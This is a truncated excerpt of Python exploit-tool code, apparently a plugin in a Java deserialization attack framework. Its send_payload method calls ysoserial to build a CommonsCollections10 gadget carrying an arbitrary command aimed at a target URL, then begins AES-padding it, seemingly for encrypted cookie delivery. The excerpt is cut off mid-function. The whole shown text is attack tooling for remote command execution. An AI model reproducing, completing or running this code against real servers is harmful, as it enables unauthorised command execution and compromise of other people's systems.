...
JAR_FILE = 'data/ysoserial.jar'


@Idea.plugin_register('Class4:CommonsCollections10')
class CommonsCollections10(object):
    ...
    def send_payload(self, url, command, res_key, fp=JAR_FILE):
        ...
        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections10', command], stdout=subprocess.PIPE)
        bs = AES.block_size
        def pad(s):
